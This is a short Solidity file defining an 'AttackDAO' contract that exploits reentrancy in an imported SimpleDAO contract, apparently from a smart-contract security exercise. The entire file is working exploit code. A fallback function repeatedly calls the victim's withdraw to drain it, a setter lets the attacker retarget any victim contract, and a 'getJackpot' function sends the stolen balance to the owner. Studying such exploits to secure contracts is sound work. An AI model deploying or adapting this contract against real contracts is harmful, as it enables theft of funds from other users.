pragma solidity ^0.4.24;

import "./SimpleDAO.sol";

contract AttackDAO {

  SimpleDAO public dao;
  address owner;

  constructor (SimpleDAO addr) public payable {
    owner = msg.sender;
    dao = addr;
  }

  function setvictim(SimpleDAO victim) public{
    dao = victim;
  }

  function donate() public payable{
    dao.donate.value(1 ether)(address(this));
  }

  function attack() public {
    dao.donate.value(1 ether)(address(this));
    dao.withdraw(1 ether);
  }

  function getJackpot() public {
    owner.send(address(this).balance);
  }

  function queryBalance() public view returns (uint) {
    return address(this).balance;
  }

  function queryAddress() public view returns (address) {
    return address(dao);
  } 

  function queryAddressB() public view returns (uint) {
    return address(dao).balance;
  }

  function queryTestB() public view returns (uint){
    return dao.queryTest();
  }

  function () public payable {
    dao.withdraw(1 ether);
  }
}
